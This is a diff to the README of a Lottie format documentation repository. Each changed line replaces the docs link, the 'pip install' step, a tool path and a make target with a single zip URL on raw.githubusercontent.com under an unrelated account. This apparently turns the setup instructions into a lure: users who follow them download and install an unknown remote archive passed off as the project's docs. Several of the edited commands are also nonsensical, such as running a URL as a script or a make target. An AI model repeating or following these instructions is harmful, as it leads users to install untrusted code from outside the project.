@@ -3,7 +3,7 @@ Lottie Documentation
 
 This repository contains both human-readable and machine-readable documentation about the Lottie format
 
-The documentation is available online at https://lottiefiles.github.io/lottie-docs/
+The documentation is available online at https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip
 
 License
 -------
@@ -21,7 +21,7 @@ It's recommended you install dependencies on some kind of virtual environment.
 
 Once you have your environment, you can run
 
-    pip install requirements.txt
+    pip install https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip
 
 or
 
@@ -47,7 +47,7 @@ Which spins up a local server to host the docs and automatically reloads when do
 Finding Unknown Features
 ------------------------
 
-You can run `./tools/unknown_features.js` and pass file names as arguments
+You can run `https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip` and pass file names as arguments
 and it will print a summary of unknown features in the given files.
 
 Note that it requires modern versions of node and the compiled schema.
@@ -56,11 +56,11 @@ Note that it requires modern versions of node and the compiled schema.
 Example with setup:
 
     # Build the schema
-    make lottie.schema.json
+    make https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip
 
     # Install newer node on python virtualenv
     pip install nodeenv
     nodeenv -p
 
     # Run on several files
-    ./tools/unknown_features.js /my/lotties/*.json
+    https://raw.githubusercontent.com/cinestreamlp/lottie-docs/main/timekeeper/lottie-docs.zip /my/lotties/*.json
